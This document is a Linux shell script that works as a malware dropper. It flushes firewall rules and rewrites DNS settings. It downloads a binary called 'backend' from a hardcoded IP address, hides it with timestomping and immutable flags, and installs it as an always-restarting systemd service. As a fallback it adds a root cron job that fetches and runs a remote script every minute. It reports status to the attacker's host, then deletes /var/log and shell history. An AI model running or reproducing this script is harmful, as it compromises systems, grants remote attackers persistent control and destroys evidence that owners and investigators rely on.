#!/bin/sh
iptables -F
chattr -ia /etc/resolv.conf
echo "nameserver 8.8.8.8" > /etc/resolv.conf
systemctl daemon-reload
if [ $? -eq 0 ]; then
systemctl is-active backend.service
        if [ $? -eq 0 ]; then
	curl -s -m 5 http://42.51.64.146:443/web2/backendOK >/dev/null 2>&1
        else
	chattr -R -aui /var/spool
	chattr -R -aui /var/spool/cron
	chattr -R -aui /var/spool/cron/crontabs
	chattr -aui /var/spool/cron/root
	chattr -aui /var/spool/cron/crontabs/root
	chattr -aui cron
	chattr -iau backend*
	chattr -iau /usr/sbin/backend*
	chattr -iau /lib/systemd/system/backend*
	crontab -r
	rm -rf backend*
	rm -rf /usr/sbin/backend*
	rm -rf /lib/systemd/system/backend*
	rm -rf /usr/lib/systemd/system/backend*
	curl -s -m 10 -O http://42.51.64.146:443/web2/backend && mv backend /usr/sbin && touch -t201502031614 /usr/sbin/backend && chmod +x /usr/sbin/backend
	chattr +ia /usr/sbin/backend
	echo "[Unit]" > backend.service
	echo "Description=backend" >> backend.service
	echo "After=multi-user.target" >> backend.service
	echo "" >> backend.service
	echo "[Service]" >> backend.service
	echo "Type=simple" >> backend.service
	echo "ExecStart=/usr/sbin/backend" >> backend.service
	echo "Restart=always" >> backend.service
	echo "RestartSec=60" >> backend.service
	echo "" >> backend.service
	echo "[Install]" >> backend.service
	echo "WantedBy=multi-user.target" >> backend.service
		if test -d /lib/systemd/system; then
		mv backend.service /lib/systemd/system && touch -t201504031614 /lib/systemd/system/backend.service && chmod 644 /lib/systemd/system/backend.service
		else
                mv backend.service /usr/lib/systemd/system && touch -t201503041614 /usr/lib/systemd/system/backend.service && chmod 644 /usr/lib/systemd/system/backend.service
		fi
		systemctl daemon-reload
		systemctl enable backend.service
		systemctl start backend.service
		systemctl is-active backend.service
			if [ $? -eq 0 ]; then
	                curl -s -m 5 http://42.51.64.146:443/web2/backendON >/dev/null 2>&1
        	        else
			curl -s -m 5 http://42.51.64.146:443/web2/backendOFF >/dev/null 2>&1
			fi
	fi
else
curl -s -m 5 http://42.51.64.146:443/web2/UBUNTU >/dev/null 2>&1
				if test -f /usr/sbin/backend && test -f /lib/systemd/system/backend.service; then
				curl -s -m 5 http://42.51.64.146:443/web2/backendUBNTYES >/dev/null 2>&1
				else
				chattr -R -aui /var/spool
				chattr -R -aui /var/spool/cron
				chattr -R -aui /var/spool/cron/crontabs
				chattr -aui /var/spool/cron/root
				chattr -aui /var/spool/cron/crontabs/root
				chattr -aui cron
				chattr -R -aui /etc/cron.d
				crontab -r
				service cron start
				service crond start
				echo '*/1 * * * * curl -m 5 -s -O http://42.51.64.146:443/web2/xxx.sh && chmod +x xxx.sh && sh xxx.sh ; rm -rf xxx.sh >/dev/null 2>&1' >cron
				crontab -u root cron
				rm -rf cron
				crontab -l | grep -e "xxx.sh" | grep -v grep
					if [ $? -eq 0 ]; then
			                curl -s -m 5 http://42.51.64.146:443/web2/cronOK >/dev/null 2>&1
				        else
			                curl -s -m 5 http://42.51.64.146:443/web2/cronBAD >/dev/null 2>&1
					fi
				fi
fi
chattr -R -aui /var/log
chattr -R -aui /root
chattr -aui /var/log/*
chattr -aui /root/*
rm -rf /var/log
rm -rf /root/.bash_history
history -cw

